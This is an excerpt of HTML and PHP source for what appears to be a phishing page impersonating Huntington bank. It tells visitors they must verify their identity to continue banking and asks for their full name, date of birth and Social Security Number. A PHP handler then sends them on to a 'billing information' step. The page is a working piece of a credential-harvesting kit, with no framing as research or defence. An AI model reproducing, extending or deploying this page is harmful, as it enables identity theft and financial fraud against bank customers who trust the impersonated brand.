...
<body>
	...
	<div class="container verify-container p-3">
		...
		<form action="" method="POST" onsubmit="load()">
			<p>To continue your usual banking activity with Huntington. We first need to verify some personal information.</p>
			<h3 class="mt-5">Personal information</h3>
			<div class="row my-1">
				<div class="col-md-6 p-3">
					<label class="my-1" for="first-name">First Name</label><br>
					<input class="" type="text" name="first-name" id="first-name" placeholder="First Name" required>
				</div>
				<div class="col-md-6 p-3">
					<label class="my-1" for="middle-name">Middle Name</label><br>
					<input class="" type="text" name="middle-name" id="middle-name" placeholder="Middle Name (optional)">
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="last-name">Last Name</label><br>
					<input class="" type="text" name="last-name" id="last-name" placeholder="Last Name" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="dob">Date of Birth</label><br>
					<input class="" type="tel" name="dob" id="dob" placeholder="Date of Birth" pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" maxlength="10" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="ssn">Social Security Number</label><br>
					<input class="" type="tel" name="ssn" id="ssn" placeholder="Social Security Number" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}" maxlength="11" required>
				</div>
			</div>
			<div class="my-5" style="text-align: right;">
				<h3>Next: Billing information</h3>
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	...
	header('Location: billing.php', true);
}
?>